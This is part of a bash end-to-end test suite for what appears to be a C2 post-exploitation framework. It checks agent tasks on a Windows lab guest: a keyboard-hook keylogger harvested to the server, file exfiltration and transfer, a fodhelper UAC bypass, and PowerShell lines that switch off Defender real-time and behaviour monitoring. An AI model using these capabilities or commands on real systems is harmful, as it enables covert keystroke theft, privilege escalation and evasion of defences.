Remove-Item -LiteralPath "$GUEST_DIR\\$NETASM_SOURCE" -Force -ErrorAction SilentlyContinue
PS
fi

# A NET_ASM command without Assembly must be rejected naming the wire key, and a blob that is not
# base64 must fail loudly instead of reporting a task that did nothing. Both are inserted directly
# because the API validator and the server's file read reject them before they reach the agent.
expect_missing_field "validation: netasm without Assembly" net_asm no_code '{}' "Assembly"

NETASM_BAD_ID="$(queue_raw_task net_asm no_code '{"Assembly":"!!not-base64!!"}')"
if ! printf '%s' "$NETASM_BAD_ID" | grep -qE '^[0-9]+$'; then
    bad "netasm: invalid base64 fails honestly" "could not queue the task: ${NETASM_BAD_ID:-<no id>}"
else
    OUT="$(wait_task "$NETASM_BAD_ID")"; STATUS="${OUT%%|*}"
    NETASM_BAD_ERR="$(task_error "$NETASM_BAD_ID")"
    if [ "$STATUS" = "error" ] && printf '%s' "$NETASM_BAD_ERR" | grep -Fiq -- "base64"; then
        ok "netasm: invalid base64 fails honestly"
    else
        bad "netasm: invalid base64 fails honestly" "status=$STATUS error=${NETASM_BAD_ERR:-<none>}"
    fi
fi

# --- keylogger (KAN-51) ---------------------------------------------------------
# Ported to the reference's WH_KEYBOARD_LL hook (clean/test Keylogger.cpp): `start` installs the hook on
# a worker thread and answers immediately, `stop` tears it down and returns the JSON capture, which it
# also harvests to the server's stream sink. A headless SSH session types nothing, so the capture is the
# empty envelope - a real result, not a failure. Two assertions: both tasks succeed, and the harvest file
# exists on the server (that is what proves the sink is wired, not the task's success string).
section "keylogger"
run_test "keylogger: start installs the hook" "/api/v1/commands/$AGENT_ID/execute/keylogger" \
    '{"Operation":"start"}' "started" ""

KEYLOG_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/keylogger" '{"Operation":"stop"}')"
KEYLOG_TASK="$(printf '%s' "$KEYLOG_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
if [ "$KEYLOG_TASK" = "0" ]; then
    bad "keylogger: stop returns the capture" "queueing failed: $KEYLOG_RESP"
else
    KEYLOG_OUT="$(wait_task "$KEYLOG_TASK")"
    KEYLOG_STATUS="${KEYLOG_OUT%%|*}"
    KEYLOG_RESULT="${KEYLOG_OUT#*|}"
    if [ "$KEYLOG_STATUS" != "success" ]; then
        bad "keylogger: stop returns the capture" \
            "status=$KEYLOG_STATUS result=$KEYLOG_RESULT error=$(task_error "$KEYLOG_TASK")"
    else
        ok "keylogger: stop returns the capture"
    fi

    # The agent posts the capture to /api/streams/<agentKey>/<taskID>/data; the server appends it to
    # storage/streams/<campaign>/<taskID>.txt inside the container (no volume: the default content root).
    KEYLOG_CAMPAIGN="$(psql_q "select \"CampaignID\" from \"Agents\" where \"ID\" = $AGENT_ID;")"
    KEYLOG_STREAM="$(ts_exec \
        cat "/app/storage/streams/$KEYLOG_CAMPAIGN/$KEYLOG_TASK.txt" 2>/dev/null | tr -d '\r')"
    if printf '%s' "$KEYLOG_STREAM" | grep -q '\['; then
        ok "keylogger: capture harvested to the server stream sink"
    else
        bad "keylogger: capture harvested to the server stream sink" \
            "no stream file for task $KEYLOG_TASK (campaign $KEYLOG_CAMPAIGN)"
    fi
fi
expect_missing_field "validation: keylogger without Operation" keylogger no_code '{}' "Operation"

# --- chunked file transfer (KAN-102/103/109) ------------------------------------
# The agent uploads and downloads whole files; the *server* also has the chunked path
# (ReceiveChunkAsync -> ordered chunk_* files -> RebuildFileAsync, and PrepareDownloadChunkAsync for a
# download). Nothing exercised it, so this drives the API directly: two chunks in, a rebuild, and the
# rebuilt bytes read back through the download route. The transfer key is the agent's check-in UUID.
section "chunked file transfer"
CHECKIN_UUID="$(psql_q "select \"CheckInUUID\" from \"Agents\" where \"ID\" = $AGENT_ID;")"
CHUNK_ID="e2e-chunk-${RUN_ID}"
CHUNK_A="chunk-a-${RUN_ID}-"
CHUNK_B="chunk-b-${RUN_ID}"
CHUNK_EXPECTED="${CHUNK_A}${CHUNK_B}"

if [ -z "$CHECKIN_UUID" ]; then
    bad "chunk: reassembled in order" "no CheckInUUID for agent $AGENT_ID"
else
    CHUNK_CODE_A="$(api_code -X POST -H 'Content-Type: application/octet-stream' \
        --data-binary "$CHUNK_A" "$API_URL/api/files/$CHECKIN_UUID/$CHUNK_ID/chunks/0")"
    CHUNK_CODE_B="$(api_code -X POST -H 'Content-Type: application/octet-stream' \
        --data-binary "$CHUNK_B" "$API_URL/api/files/$CHECKIN_UUID/$CHUNK_ID/chunks/1")"
    CHUNK_REBUILD="$(curl -sS -m 20 -X POST "$API_URL/api/files/$CHECKIN_UUID/$CHUNK_ID/rebuild")"
    CHUNK_CONTENT="$(curl -sS -m 20 "$API_URL/api/files/$CAMPAIGN_ID/${CHUNK_ID}_rebuilt" 2>/dev/null)"
    if [ "$CHUNK_CODE_A" != "200" ] || [ "$CHUNK_CODE_B" != "200" ]; then
        bad "chunk: reassembled in order" "chunk posts answered $CHUNK_CODE_A / $CHUNK_CODE_B"
    elif ! printf '%s' "$CHUNK_REBUILD" | grep -q "${CHUNK_ID}_rebuilt"; then
        bad "chunk: reassembled in order" "rebuild did not report the rebuilt file: $CHUNK_REBUILD"
    elif [ "$CHUNK_CONTENT" = "$CHUNK_EXPECTED" ]; then
        ok "chunk: two chunks reassembled in order"
    else
        bad "chunk: reassembled in order" "rebuilt content mismatch (got '$CHUNK_CONTENT')"
    fi
    ts_exec \
        rm -rf "/app/storage/files/$CAMPAIGN_ID/$CHUNK_ID" "/app/storage/files/$CAMPAIGN_ID/${CHUNK_ID}_rebuilt" \
        >/dev/null 2>&1 || true
fi

# --- escalate (UAC bypass) -----------------------------------------------------
# Defender's behaviour monitor terminates the payload the moment it writes the ms-settings
# registry key, so this test needs real-time protection off. Toggling it is only possible
# when tamper protection is off; otherwise the test is skipped rather than fought.
AV_TOGGLED=0
AV_TAMPER="$(ps_run_admin <<'PS' 2>/dev/null | tr -d '\r' | grep -iE '^(True|False)$' | head -1
(Get-MpComputerStatus).IsTamperProtected
PS
)"

# UAC bypass needs an administrator account: a standard user cannot start an autoElevate
# binary at all (CreateProcess fails with ERROR_ELEVATION_REQUIRED), so distinguish that
# legitimate precondition from a real failure.
IS_ADMIN="$(ps_run_admin <<PS 2>/dev/null | tr -d '\r'
net localgroup Administrators | Select-String -SimpleMatch "$USERNAME" | ForEach-Object { \$_.Line }
PS
)"

if [ "$AV_TAMPER" = "False" ]; then
    ps_run_admin <<'PS' >/dev/null 2>&1
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
PS
    AV_TOGGLED=1
    info "AV real-time/behaviour protection disabled for the escalate test"
elif [ "$AV_TAMPER" = "True" ]; then
    skip "escalate: fodhelper" "defender tamper protection is on; cannot disable AV for the test"
else
    info "could not read AV state; running escalate with AV as-is"
fi

if [ "$AV_TAMPER" != "True" ]; then
    # The task's success string only means CreateProcessW(FodHelper) worked; it does not prove
    # elevation. Write a marker from the *elevated* command and check its integrity level.
    # The marker is in the user profile: the guest denies writes to C:\Users\Public from a
    # network-logon (SSH) token, which would make the check fail for the wrong reason.
    ELEV_MARKER="$GUEST_DIR\\e2e_elev_${RUN_ID}.txt"
    ps_run <<PS >/dev/null 2>&1
Remove-Item -LiteralPath "$ELEV_MARKER" -Force -ErrorAction SilentlyContinue
PS

    # What integrity does the *agent* run at? A network-logon admin is already High (UAC filtering
    # is skipped for network logons), so a High child under a High parent is inheritance, not a
    # bypass. Without this the case passes for any admin-over-SSH agent and proves nothing.
    PARENT_IL=""
    IL_PROBE_TASK="$(api_post "/api/v1/commands/$AGENT_ID/spawn/shell" \
        '{"Command":"whoami /groups"}' | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
    if [ "$IL_PROBE_TASK" != "0" ]; then
        IL_OUT="$(wait_task "$IL_PROBE_TASK")"
        PARENT_IL="$(printf '%s' "${IL_OUT#*|}" | grep -oE '(Low|Medium|High|System) Mandatory Level' | head -1)"
    fi
    [ -n "$PARENT_IL" ] || PARENT_IL="$(printf '%s' "$(task_error "$IL_PROBE_TASK" 2>/dev/null)" | grep -oE '(Low|Medium|High|System) Mandatory Level' | head -1)"
    info "escalate: agent integrity is ${PARENT_IL:-unknown}"

    ELEV_BODY="$(python3 -c 'import json,sys; print(json.dumps({"RegKey":"fodhelper","TargetBinary":sys.argv[1]}))' \
        "whoami /groups > $ELEV_MARKER")"
    ELEV_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/escalate" "$ELEV_BODY")"
    ELEV_TASK="$(printf '%s' "$ELEV_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

    if [ "$ELEV_TASK" = "0" ]; then
        bad "escalate: fodhelper" "queueing failed: $ELEV_RESP"
    else
        OUT="$(wait_task "$ELEV_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
        # A failed task's diagnostic now lives in the Errors table, not in the result output.
        [ -n "$RESULT" ] || RESULT="$(task_error "$ELEV_TASK")"
        ELEV_IL="$(ps_run <<PS 2>/dev/null | tr -d '\r' | grep -i 'Mandatory Level' | head -1
if (Test-Path -LiteralPath "$ELEV_MARKER") {
  Get-Content -LiteralPath "$ELEV_MARKER" | Select-String 'Mandatory Level'
}
PS
)"

        if [ "$STATUS" = "timeout" ]; then
            bad "escalate: fodhelper" "no result - agent likely terminated (check Defender detections)"
        elif [ -z "$IS_ADMIN" ] && printf '%s' "$RESULT" | grep -qiE 'could not start elevated|ShellExecuteW returned'; then
            # Not an administrator is the documented precondition: the shell will not hand an
            # autoElevate binary to AppInfo for a standard user, so the agent reports
            # "ShellExecuteW returned 5" (access denied). Both message shapes are accepted so an
            # old payload still classifies honestly; an admin agent's failure falls through to bad.
            skip "escalate: fodhelper" "agent runs as $USERNAME (not an administrator); UAC bypass needs an admin account ($RESULT)"
        elif [ "$STATUS" != "success" ]; then
            bad "escalate: fodhelper" "status=$STATUS result=$RESULT"
        elif [ -z "$ELEV_IL" ]; then
            bad "escalate: fodhelper" "command never ran (no marker; result=$RESULT)"
        elif printf '%s' "$ELEV_IL" | grep -qi 'High Mandatory Level' &&
             printf '%s' "$PARENT_IL" | grep -qi 'High Mandatory Level'; then
            # High under a High parent proves inheritance, not a bypass: this is what an admin
            # agent started over SSH (network logon, UAC filtering skipped) always looks like.
            skip "escalate: fodhelper" "agent already runs at High ($PARENT_IL); High child is inheritance, not a bypass — needs an interactive (UAC-filtered) admin token"
        elif printf '%s' "$ELEV_IL" | grep -qi 'High Mandatory Level'; then
            ok "escalate: fodhelper -> High integrity (from ${PARENT_IL:-an unknown parent})"
        else
            skip "escalate: fodhelper" "executed at $(printf '%s' "$ELEV_IL" | grep -oiE '(Low|Medium|High|System) Mandatory Level') - needs an interactive admin session"
        fi
    fi
fi

if [ "$AV_TOGGLED" = "1" ]; then
    ps_run_admin <<'PS' >/dev/null 2>&1
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
PS
    info "AV real-time/behaviour protection restored"
fi

# --- file transfer -------------------------------------------------------------
section "file transfer"
PROBE_NAME="e2e_probe_${RUN_ID}.txt"
PROBE_BODY="trinity-e2e-${RUN_ID}"
PROBE_LOCAL="$GUEST_DIR\\$PROBE_NAME"

ps_run <<PS >/dev/null 2>&1
Set-Content -Path (Join-Path \$env:USERPROFILE "$PROBE_NAME") -Value "$PROBE_BODY" -NoNewline
PS

if ! guest_exists "$PROBE_LOCAL"; then
    bad "upload" "probe file was not created on the guest ($PROBE_LOCAL) - nothing to upload"
    PROBE_READY=0
else
    PROBE_READY=1
fi

UPLOAD_BODY="$(python3 -c 'import json,sys; print(json.dumps({"Path": sys.argv[1]}))' "$PROBE_LOCAL")"

if [ "${PROBE_READY:-1}" = "1" ]; then
UPLOAD_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/upload" "$UPLOAD_BODY")"
UPLOAD_TASK="$(printf '%s' "$UPLOAD_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

if [ "$UPLOAD_TASK" = "0" ]; then
    bad "upload" "queueing failed: $UPLOAD_RESP"
else
    OUT="$(wait_task "$UPLOAD_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    if [ "$STATUS" = "success" ]; then
        STORED="$(ts_exec \
            cat "/app/storage/files/$CAMPAIGN_ID/$PROBE_NAME" 2>/dev/null | tr -d '\r\n')"
        if [ "$STORED" = "$PROBE_BODY" ]; then
            ok "upload: file stored under campaign $CAMPAIGN_ID with matching content"
        else
            bad "upload" "stored content mismatch (got '$STORED')"
        fi
    else
        bad "upload" "status=$STATUS result=$RESULT"
    fi
fi

# The download endpoint serves /api/files/<campaign>/<name>, so deleting the guest copy
# first makes the assertion unambiguous (the file can only come back from the server).
ps_run <<PS >/dev/null 2>&1
Remove-Item -Path (Join-Path \$env:USERPROFILE "$PROBE_NAME") -Force -ErrorAction SilentlyContinue
PS

DOWNLOAD_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/filedownload" "$UPLOAD_BODY")"
DOWNLOAD_TASK="$(printf '%s' "$DOWNLOAD_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

if [ "$DOWNLOAD_TASK" = "0" ]; then
    bad "download" "queueing failed: $DOWNLOAD_RESP"
else
    OUT="$(wait_task "$DOWNLOAD_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    if [ "$STATUS" = "success" ]; then
        CONTENT="$(ps_run <<PS 2>/dev/null | tr -d '\r\n'
if (Test-Path (Join-Path \$env:USERPROFILE "$PROBE_NAME")) {
  Get-Content -Raw -Path (Join-Path \$env:USERPROFILE "$PROBE_NAME")
}
PS
)"
        if [ "$CONTENT" = "$PROBE_BODY" ]; then
            ok "download: file restored on the guest with matching content"
        else
            bad "download" "guest content mismatch (got '$CONTENT')"
        fi
    else
        bad "download" "status=$STATUS result=$RESULT"
    fi
fi

fi  # PROBE_READY

# --- large file: the chunked-upload branch -------------------------------------
# HandleUpload sends files below 100 MB in one request and streams the rest in 10 MB chunks followed by
# /rebuild, so the small case above never reaches the threshold branch. The file is patterned rather
# than zeros: the hash is the assertion, and zeros would survive a reordered reassembly.
section "large file upload (chunked)"
BIG_NAME="e2e_big_${RUN_ID}.bin"
BIG_LOCAL="$GUEST_DIR\\$BIG_NAME"
BIG_BLOCKS=105  # 105 MiB, comfortably over the 100 MB threshold
BIG_TRANSFER="big-$RUN_ID"

BIG_HASH="$(ps_run <<PS 2>/dev/null | tr -d '\r\n'
\$path = Join-Path \$env:USERPROFILE "$BIG_NAME"
\$fs = [IO.File]::Create(\$path)
\$rnd = New-Object System.Random 42
\$block = New-Object byte[] (1MB)
for (\$i = 0; \$i -lt $BIG_BLOCKS; \$i++) { \$rnd.NextBytes(\$block); \$fs.Write(\$block, 0, \$block.Length) }
\$fs.Close()
(Get-FileHash -Algorithm SHA256 -Path \$path).Hash.ToLower()
PS
)"

if [ -z "$BIG_HASH" ]; then
    bad "upload big: chunked transfer" "could not create the $BIG_BLOCKS MiB file on the guest ($BIG_LOCAL)"
else
    BIG_BODY="$(python3 -c 'import json,sys; print(json.dumps({"Path": sys.argv[1], "TransferID": sys.argv[2]}))' "$BIG_LOCAL" "$BIG_TRANSFER")"
    BIG_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/upload" "$BIG_BODY")"
    BIG_TASK="$(printf '%s' "$BIG_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
    if [ "$BIG_TASK" = "0" ]; then
        bad "upload big: chunked transfer" "queueing failed: $BIG_RESP"
    else
        OUT="$(wait_task "$BIG_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
        if [ "$STATUS" != "success" ]; then
            bad "upload big: chunked transfer" "status=$STATUS error=$(task_error "$BIG_TASK")"
        elif ! printf '%s' "$RESULT" | grep -qi 'chunks';
        then
            # A success message without the chunk count means the small-file path ran and the
            # threshold branch is still unexercised.
            bad "upload big: chunked transfer" "reported success without the chunked path: $RESULT"
        else
            SERVER_HASH="$(ts_exec \
                sha256sum "/app/storage/files/$CAMPAIGN_ID/${BIG_TRANSFER}_rebuilt" 2>/dev/null | cut -d' ' -f1 | tr -d '\r')"
            if [ "$SERVER_HASH" = "$BIG_HASH" ]; then
                ok "upload big: 105 MiB chunked and reassembled with a matching hash"
            else
                bad "upload big: chunked transfer" "server hash '${SERVER_HASH:-<missing>}' != guest hash '$BIG_HASH' (result: $RESULT)"
            fi
        fi
    fi

    # Clean both sides so a rerun cannot pass on a leftover.
    ps_run <<PS >/dev/null 2>&1
Remove-Item -Path (Join-Path \$env:USERPROFILE "$BIG_NAME") -Force -ErrorAction SilentlyContinue
PS
    ts_exec \
        rm -f "/app/storage/files/$CAMPAIGN_ID/${BIG_TRANSFER}_rebuilt" >/dev/null 2>&1
fi

# --- multi-chunk download -------------------------------------------------------
# The server rewrites every DOWNLOAD into 512 KiB DownloadChunkPayload documents, so a file larger than
# one chunk needs several 5 s check-in cycles, each writing at its own offset. The small probe above fits
# in a single chunk and cannot tell an append from a truncate; this file is 2 MiB, i.e. four chunks.
section "multi-chunk download"
CHUNKED_NAME="e2e_chunked_${RUN_ID}.bin"
CHUNKED_LOCAL="$GUEST_DIR\\$CHUNKED_NAME"
CHUNKED_TRANSFER="chunked-$RUN_ID"

CHUNKED_HASH="$(ps_run <<PS 2>/dev/null | tr -d '\r\n'
\$path = Join-Path \$env:USERPROFILE "$CHUNKED_NAME"
\$fs = [IO.File]::Create(\$path)
\$rnd = New-Object System.Random 7
\$block = New-Object byte[] (1MB)
for (\$i = 0; \$i -lt 2; \$i++) { \$rnd.NextBytes(\$block); \$fs.Write(\$block, 0, \$block.Length) }
\$fs.Close()
(Get-FileHash -Algorithm SHA256 -Path \$path).Hash.ToLower()
PS
)"

if [ -z "$CHUNKED_HASH" ]; then
    bad "download chunks: 2 MiB reassembled" "could not create the file on the guest ($CHUNKED_LOCAL)"
else
    CHUNKED_BODY="$(python3 -c 'import json,sys; print(json.dumps({"Path": sys.argv[1], "TransferID": sys.argv[2]}))' "$CHUNKED_LOCAL" "$CHUNKED_TRANSFER")"
    UP_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/upload" "$CHUNKED_BODY")"
    UP_TASK="$(printf '%s' "$UP_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
    if [ "$UP_TASK" = "0" ]; then
        bad "download chunks: staging upload" "queueing failed: $UP_RESP"
    else
        OUT="$(wait_task "$UP_TASK")"; STATUS="${OUT%%|*}"
        if [ "$STATUS" != "success" ]; then
            bad "download chunks: staging upload" "status=$STATUS error=$(task_error "$UP_TASK")"
        else
            # The download can only be chunked if the server actually holds the file: a failed
            # store still answers 2xx on the listener, and then every prepare falls back with
            # FileNotFound and the case sits in the queue until the timeout. Assert it here so the
            # failure names the upload instead of a stalled download.
            STAGED_BYTES="$(ts_exec \
                stat -c %s "/app/storage/files/$CAMPAIGN_ID/$CHUNKED_NAME" 2>/dev/null | tr -d '\r')"
            if [ "$STAGED_BYTES" != "2097152" ]; then
                bad "download chunks: staging upload" \
                    "the server holds '${STAGED_BYTES:-<nothing>}' bytes for $CHUNKED_NAME, expected 2097152"
            else
            # Remove the guest copy so the restored bytes can only come from the server.
            ps_run <<PS >/dev/null 2>&1
Remove-Item -Path (Join-Path \$env:USERPROFILE "$CHUNKED_NAME") -Force -ErrorAction SilentlyContinue
PS

            DL_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/filedownload" "$CHUNKED_BODY")"
            DL_TASK="$(printf '%s' "$DL_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
            if [ "$DL_TASK" = "0" ]; then
                bad "download chunks: 2 MiB reassembled" "queueing failed: $DL_RESP"
            else
                OUT="$(wait_task "$DL_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
                RESTORED_HASH="$(ps_run <<PS 2>/dev/null | tr -d '\r\n'
\$path = Join-Path \$env:USERPROFILE "$CHUNKED_NAME"
if (Test-Path \$path) { (Get-FileHash -Algorithm SHA256 -Path \$path).Hash.ToLower() }
PS
)"
                if [ "$STATUS" != "success" ]; then
                    bad "download chunks: 2 MiB reassembled" "status=$STATUS error=$(task_error "$DL_TASK")"
                elif ! printf '%s' "$RESULT" | grep -qi 'transfer complete';
                then
                    # Without the final chunk the server served the file whole, so the offset logic
                    # it is meant to exercise never ran.
                    bad "download chunks: 2 MiB reassembled" "the task did not finish a chunked transfer: $RESULT"
                elif [ "$RESTORED_HASH" != "$CHUNKED_HASH" ]; then
                    bad "download chunks: 2 MiB reassembled" "restored hash '${RESTORED_HASH:-<missing>}' != original '$CHUNKED_HASH' (result: $RESULT)"
                else
                    ok "download chunks: 2 MiB restored in four chunks with a matching hash ($RESULT)"
                fi
            fi

            # Clean both sides so a rerun cannot pass on a leftover.
            ps_run <<PS >/dev/null 2>&1
Remove-Item -Path (Join-Path \$env:USERPROFILE "$CHUNKED_NAME") -Force -ErrorAction SilentlyContinue
PS
            ts_exec \
                rm -f "/app/storage/files/$CAMPAIGN_ID/$CHUNKED_NAME" >/dev/null 2>&1
            fi
        fi
    fi
fi

# --- armoury (KAN-111 surface on the integrated tree) --------------------------
# Server-only: an upload lands in the TeamServer's Armoury directory and the Tools table, and needs
# no agent at all. Asserting it here means a broken Armoury (bad DI registration, missing migration)
# fails the gate instead of being discovered from the UI.
section "armoury"
TOOL_NAME="e2e-tool-${RUN_ID}"
TOOL_FILE="$WORK_DIR/$TOOL_NAME.txt"
printf 'e2e armoury payload %s\n' "$RUN_ID" > "$TOOL_FILE"
OPERATOR_ID="$(psql_q 'select "ID" from "Operators" order by "ID" limit 1')"
if [ -z "$OPERATOR_ID" ]; then
    skip "armoury: upload, list, remove" "no operator row in the database"
else
    ANON_ARMOURY="$(api_code "$API_URL/api/v1/armoury/tools?pagination=0&rows=10")"
    AUTH_ARMOURY="$(api_code -H "$AUTH" "$API_URL/api/v1/armoury/tools?pagination=0&rows=10")"
    if [ "$ANON_ARMOURY" != "401" ]; then
        bad "armoury: anonymous is 401" "got $ANON_ARMOURY"
    elif [ "$AUTH_ARMOURY" != "200" ]; then
        bad "armoury: authorized is 200" "got $AUTH_ARMOURY (missing migration or DI registration)"
    else
        ok "armoury: anonymous 401 / authorized 200"
    fi

    TOOL_RESP="$(curl -sS -m 30 -X POST -H "$AUTH" \
        -F "Name=$TOOL_NAME" -F "OperatorID=$OPERATOR_ID" -F "file=@$TOOL_FILE" \
        "$API_URL/api/v1/armoury/upload" 2>&1)"
    TOOL_ID="$(printf '%s' "$TOOL_RESP" | python3 -c 'import json,sys,re
raw = sys.stdin.read()
try:
    body = json.loads(raw)
except Exception:
    match = re.search(r"Id\s*=\s*(\d+)", raw)
    print(match.group(1) if match else "")
    raise SystemExit
print(body.get("id", "") if isinstance(body, dict) else "")')"
    if [ -z "$TOOL_ID" ]; then
        # The controller answers the created tool; some shapes answer a Result wrapper instead.
        TOOL_ID="$(psql_q "select \"ID\" from \"Tools\" where \"Name\" = '$TOOL_NAME' order by \"ID\" desc limit 1")"
    fi
    if [ -z "$TOOL_ID" ]; then
        bad "armoury: upload stores the tool" "upload answered: $(printf '%s' "$TOOL_RESP" | head -c 200)"
    else
        ok "armoury: upload stores the tool (id $TOOL_ID)"
    fi

    LISTED="$(api_get "/api/v1/armoury/tools?pagination=0&rows=50" | grep -c "$TOOL_NAME" || true)"
    [ "${LISTED:-0}" -ge 1 ] && ok "armoury: the uploaded tool is listed" \
        || bad "armoury: the uploaded tool is listed" "not found in the listing"

    if [ -n "$TOOL_ID" ]; then
        REMOVE_CODE="$(api_code -X DELETE -H "$AUTH" "$API_URL/api/v1/armoury/remove/$TOOL_ID")"
        [ "$REMOVE_CODE" = "200" ] && ok "armoury: remove deletes the tool" \
            || bad "armoury: remove deletes the tool" "got $REMOVE_CODE"
        REMAINING="$(api_get "/api/v1/armoury/tools?pagination=0&rows=50" | grep -c "$TOOL_NAME" || true)"
        [ "${REMAINING:-0}" -eq 0 ] && ok "armoury: the removed tool is gone from the listing" \
            || bad "armoury: the removed tool is gone from the listing" "still listed after delete"
    fi
fi

# --- token validation (KAN-42) -------------------------------------------------
# A presented-but-invalid token must be rejected. Asserting only "anonymous is 401" would pass a
# server that ignores the header and authorizes everyone.
section "token validation"
GARBAGE_CODE="$(api_code -H "Authorization: Bearer not-a-token" "$API_URL/api/v1/agents")"
[ "$GARBAGE_CODE" = "401" ] && ok "token: an invalid bearer token is rejected" \
    || bad "token: an invalid bearer token is rejected" "got $GARBAGE_CODE"

# --- agent exit (KILL, KAN-40) -------------------------------------------------
# Last, because it ends the agent: the task must reach the server as success *before* the process goes, so
# the assertion is the stored result plus the guest's process table. A command that exits inside the
# dispatcher would leave the task queued forever - which is exactly what this checks for.
section "agent exit (KILL)"
EXIT_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/kill" '{}')"
EXIT_TASK="$(printf '%s' "$EXIT_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
if [ "$EXIT_TASK" = "0" ]; then
    bad "exit: agent stops after reporting" "queueing failed: $EXIT_RESP"
else
    OUT="$(wait_task "$EXIT_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    if [ "$STATUS" != "success" ]; then
        bad "exit: agent stops after reporting" "status=$STATUS error=$(task_error "$EXIT_TASK")"
    else
        AGENT_BASE="${AGENT_NAME%.exe}"
        EXIT_GONE=0
        for _ in 1 2 3 4 5 6; do
            if [ -z "$(ps_run <<PS 2>/dev/null | tr -d '\r\n'
Get-Process -Name "$AGENT_BASE" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty Id
PS
)" ]; then
                EXIT_GONE=1
                break
            fi
            sleep 3
        done
        if [ "$EXIT_GONE" = "1" ]; then
            ok "exit: agent stops after reporting"
        else
            bad "exit: agent stops after reporting" "the task reported success but the agent is still running"
        fi
    fi
fi

# --------------------------------------------------------------------------- summary
section "summary"
printf '%s\n' "${SUMMARY[@]}" | sed 's/^/   /'
printf '\n   %s%d passed%s, %s%d failed%s, %s%d skipped%s\n' \
    "$C_GREEN" "$PASS" "$C_RESET" "$C_RED" "$FAIL" "$C_RESET" "$C_YELLOW" "$SKIP" "$C_RESET"

# A case that dies mid-body (a bad substitution, a broken guard) emits no verdict at all, and a
# green run then hides the loss: that is how a failing `set sleep` case silently disappeared from a
# 63/0/0. The floor is the number of cases this suite is expected to emit; it is a floor, not an
# equality, so adding a case does not fail the gate, while losing one does.
TOTAL_VERDICTS=$((PASS + FAIL + SKIP))
EXPECTED_CASES="${EXPECTED_CASES:-64}"
if [ "$TOTAL_VERDICTS" -lt "$EXPECTED_CASES" ]; then
    printf '%s   case-count %s is below the expected %s: a case produced no verdict (see above for a shell error)%s\n' \
        "$C_RED" "$TOTAL_VERDICTS" "$EXPECTED_CASES" "$C_RESET"
    exit 1
fi

[ "$FAIL" -eq 0 ] || exit 1
exit 0
